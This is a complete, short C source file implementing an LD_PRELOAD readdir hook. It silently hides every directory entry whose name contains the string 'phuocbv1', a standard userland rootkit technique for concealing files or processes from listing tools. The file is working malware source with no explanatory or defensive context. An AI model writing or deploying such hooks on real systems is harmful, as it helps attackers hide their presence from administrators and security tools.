#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

static struct dirent* (*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        
        if (strstr(entry->d_name, "phuocbv1") != NULL) {
            continue; 
        }

        return entry;
    }
    return NULL;
}
